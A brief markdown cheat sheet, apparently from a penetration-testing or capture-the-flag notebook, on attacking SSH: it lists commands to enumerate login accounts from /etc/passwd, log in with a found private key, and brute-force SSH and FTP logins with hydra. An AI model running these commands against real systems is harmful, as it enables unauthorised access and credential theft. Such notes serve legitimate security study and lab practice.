---
title: ssh
aliases:
tags:
---

# ssh

- techniques
    - if you have id_rsa or passwords, try them for all interactive accounts in /etc/shadow (password reuse)
        - `cat /etc/passwd | grep -v nologin | cut -d ":" -f 1`
    - if you have an id_rsa file
        - `chmod 400 id_rsa; ssh -i id_rsa username@$ip`
    - brute force 
        - `hydra -L user.list -P password.list ssh://$ip`
            - <span style=color:orange>this is very slow - target ftp instead `hydra -l username -P mut_password.list ftp://$ip -t 64`</span>
